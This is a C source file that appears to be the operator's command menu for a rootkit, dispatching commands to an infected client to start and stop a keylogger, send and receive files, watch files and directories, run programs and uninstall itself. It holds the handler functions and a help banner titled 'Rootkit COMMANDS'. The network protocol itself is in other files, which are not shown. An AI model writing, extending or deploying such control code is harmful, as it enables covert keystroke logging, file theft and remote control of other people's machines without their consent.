#include "menu.h"
#include "utils.h"

#include <ctype.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include "protocol.h"

//NOLINTNEXTLINE
void cmd_disconnect(struct server_options * server_options) {
    printf("Disconnecting from client and exiting program\n");
    send_disconnect(server_options->client_fd);
    exit_flag = true;
}

//NOLINTNEXTLINE
void cmd_uninstall(struct server_options * server_options) {
    printf("Uninstalling client program\n");
    send_uninstall(server_options->client_fd);
}

//NOLINTNEXTLINE
void cmd_start_keylogger(struct server_options * server_options) {
    printf("Starting Keylogger\n");

    send_start_keylogger(server_options->client_fd);
}

//NOLINTNEXTLINE
void cmd_stop_keylogger(struct server_options * server_options) {
    printf("Stopping Keylogger\n");
    send_stop_keylogger(server_options->client_fd);
}


void cmd_transfer_file(struct server_options * server_options) {
    printf("Transferring file\n");
    send_file(server_options);
}

//NOLINTNEXTLINE
void cmd_receive_file(struct server_options * server_options) {
    printf("Receiving File\n");
    receive_file(server_options->client_fd);
}

//NOLINTNEXTLINE
void cmd_watch_file(struct server_options * server_options) {
    printf("Watching specified file\n");
    send_watch(server_options->client_fd, T_FILE, "");
}

//NOLINTNEXTLINE
void cmd_watch_directory(struct server_options * server_options) {
    printf("Watching specified directory\n");
    send_watch(server_options->client_fd, T_DIRECTORY, "");
}

//NOLINTNEXTLINE
void cmd_run_program(struct server_options * server_options) {
    printf("Running specified program\n");
    send_run_program(server_options->client_fd);
}

void cmd_show_help() {
    printf("\n");
    printf("--------------------------------------------------------------------\n");
    printf("Rootkit COMMANDS\n");
    printf("--------------------------------------------------------------------\n");

    for (int i = 0; g_menu_commands[i].key != NULL; i++) {
        printf("\t [%s] %-60s\n", g_menu_commands[i].key, g_menu_commands[i].description);
    }

    printf("--------------------------------------------------------------------\n");
    printf("\n");
}


void process_command(struct server_options * server_options, const char *input) {
    while (*input && isspace(*input)) input++;

    if (*input == '\0') return;

    for (int i = 0; g_menu_commands[i].key != NULL; i++) {
        if (strcmp(input, g_menu_commands[i].key) == 0) {
            g_menu_commands[i].handler(server_options);
            return;
        }
    }

    printf("Unknown command: '%s'. Press 'h' for help.\n", input);
}